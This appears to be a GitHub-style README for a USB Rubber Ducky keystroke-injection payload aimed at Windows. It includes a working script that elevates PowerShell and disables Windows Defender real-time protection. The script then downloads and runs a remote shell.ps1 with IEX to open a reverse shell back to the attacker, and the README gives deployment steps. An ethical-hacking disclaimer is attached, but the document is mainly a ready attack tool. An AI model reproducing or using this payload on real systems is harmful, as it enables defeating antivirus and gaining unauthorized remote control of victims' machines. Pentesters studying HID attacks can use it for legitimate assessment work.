
# Reverse Shell Automation Script for Windows (Payload)

This script is designed to disable Windows Defender and execute a reverse shell on a target Windows machine. The script uses PowerShell commands to achieve these tasks, making it suitable for penetration testing and security assessments. **Note**: This script is intended for ethical hacking and educational purposes only. Unauthorized use of this script is illegal and unethical.

## How It Works

1. **Disable Windows Defender**: The script initiates an elevated PowerShell session to disable Windows Defender's real-time protection. This allows the execution of potentially malicious scripts without being blocked by the antivirus software.

2. **Establish a Reverse Shell**: After disabling Windows Defender, the script downloads and executes a reverse shell PowerShell script from a remote server. This connects back to the attacker's machine, giving them remote access to the target system.

## Script Breakdown

1. **Turn off Windows Defender**:
   - The script uses a combination of Windows GUI automation (via key presses) and PowerShell commands to disable Windows Defender's real-time protection.
   - It starts by opening a Run dialog (`GUI r`) and then executing a PowerShell command to disable Windows Defender.

2. **Start Reverse Shell**:
   - After disabling Windows Defender, the script opens another Run dialog to execute a PowerShell command that downloads and runs a reverse shell script from a remote server.

## Usage

1. **Preparation**:
   - Host a reverse shell script (`shell.ps1`) on a remote server that is accessible from the target machine.
   - Update the script with the appropriate IP address and path to the reverse shell script.

2. **Deploy the Script**:
   - The script can be deployed using a USB Rubber Ducky, Teensy, or other HID (Human Interface Device) attack platforms that can automate keystrokes on the target machine.

3. **Run the Script**:
   - Plug the device into the target machine.
   - The script will execute automatically, turning off Windows Defender and establishing a reverse shell.

## Example Script

```powershell
REM Turn off Windows Defender and start reverse shell
REM
DELAY 1000
GUI r
DELAY 200
REM Start an elevated powershell instance which will disable Windows Defender.
STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
ENTER
DELAY 1000
REM if you need administrator [left, enter and delay 1000]
LEFT
ENTER
DELAY 1000
ALT y
DELAY 1000
GUI r
DELAY 100
STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.15/shell.ps1');"
ENTER
STRING exit
ENTER
```

## Disclaimer

This script is for **educational purposes only**. Misuse of this script can result in criminal charges and legal consequences. The authors are not responsible for any misuse or damage caused by this script. Use responsibly and always have permission before attempting to access or compromise any systems.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---
@Author: Subhash Paudel
